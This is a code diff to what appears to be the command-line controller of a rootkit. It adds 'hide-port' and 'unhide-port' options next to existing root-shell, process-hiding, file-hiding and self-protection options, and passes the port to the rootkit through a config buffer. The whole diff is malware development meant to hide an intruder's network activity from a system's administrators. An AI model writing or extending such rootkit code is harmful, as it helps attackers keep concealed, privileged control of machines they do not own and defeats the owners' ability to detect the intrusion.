@@ -46,7 +46,8 @@ void print_help(char **argv)
 }
 
 void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_pid,
-                                   int *unhide_pid, char **pid, int *hide_file,
+                                   int *unhide_pid, char **pid, int *hide_port,
+                                   int *unhide_port, char **port, int *hide_file,
                                    int *unhide_file, char **file, int *hide,
                                    int *unhide, int *protect, int *unprotect)
 {
@@ -62,6 +63,8 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
         {"root-shell",  no_argument,       0, 'a'},
         {"hide-pid",    required_argument, 0, 'b'},
         {"unhide-pid",  required_argument, 0, 'c'},
+        {"hide-port",   required_argument, 0, 'k'},
+        {"unhide-port", required_argument, 0, 'm'},
         {"hide-file",   required_argument, 0, 'd'},
         {"unhide-file", required_argument, 0, 'e'},
         {"hide",        no_argument,       0, 'f'},
@@ -76,6 +79,9 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
     *hide_pid = 0;
     *unhide_pid = 0;
     *pid = NULL;
+    *hide_port = 0;
+    *unhide_port = 0;
+    *port = NULL;
     *hide_file = 0;
     *unhide_file = 0;
     *file = NULL;
@@ -133,6 +139,18 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
             case 'j':
                 *unprotect = 1;
                 break;
+                
+            case 'k':
+                *hide_port = 1;
+                *port = optarg;
+                break;
+                
+            case 'm':
+                *unhide_port = 1;
+                *port = optarg;
+                break;
+            
+                
 
             case '?':
                 fprintf(stderr, "Error: Unrecognized option %s\n\n", argv[optind - 1]);
@@ -147,7 +165,7 @@ void handle_command_line_arguments(int argc, char **argv, int *root, int *hide_p
     }
 
     if ((*root + *hide_pid + *unhide_pid + *hide_file + *unhide_file + *hide
-            + *unhide + *protect + *unprotect) != 1) {
+            + *unhide + *protect + *unprotect + *hide_port + *unhide_port) != 1) {
         fprintf(stderr, "Error: Exactly one option should be specified\n\n");
         print_help(argv);
         exit(1);
@@ -166,6 +184,9 @@ int main(int argc, char **argv)
     int hide_pid;
     int unhide_pid;
     char *pid;
+    int hide_port;
+    int unhide_port;
+    char *port;
     int hide_file;
     int unhide_file;
     char *file;
@@ -175,6 +196,7 @@ int main(int argc, char **argv)
     int unprotect;
 
     handle_command_line_arguments(argc, argv, &root, &hide_pid, &unhide_pid, &pid,
+                                  &hide_port, &unhide_port, &port,
                                   &hide_file, &unhide_file, &file, &hide, &unhide,
                                   &protect, &unprotect);
 
@@ -188,6 +210,14 @@ int main(int argc, char **argv)
         buf_size += sizeof(CFG_HIDE_PID) + strlen(pid);
     } else if (unhide_pid) {
         buf_size += sizeof(CFG_UNHIDE_PID) + strlen(pid);
+        
+        
+    } else if (hide_port) {
+        buf_size += sizeof(CFG_HIDE_PORT) + strlen(port);
+    } else if (unhide_port) {
+        buf_size += sizeof(CFG_UNHIDE_PORT) + strlen(port);  
+        
+      
     } else if (hide_file) {
         buf_size += sizeof(CFG_HIDE_FILE) + strlen(file);
     } else if (unhide_file) {
@@ -219,6 +249,16 @@ int main(int argc, char **argv)
     } else if (unhide_pid) {
         write_buffer(&buf_ptr, CFG_UNHIDE_PID, sizeof(CFG_UNHIDE_PID));
         write_buffer(&buf_ptr, pid, strlen(pid));
+        
+        
+    } else if (hide_port) {
+        write_buffer(&buf_ptr, CFG_HIDE_PORT, sizeof(CFG_HIDE_PORT));
+        write_buffer(&buf_ptr, port, strlen(port));
+    } else if (unhide_port) {
+        write_buffer(&buf_ptr, CFG_UNHIDE_PORT, sizeof(CFG_UNHIDE_PORT));
+        write_buffer(&buf_ptr, port, strlen(port));
+        
+        
     } else if (hide_file) {
         write_buffer(&buf_ptr, CFG_HIDE_FILE, sizeof(CFG_HIDE_FILE));
         write_buffer(&buf_ptr, file, strlen(file));
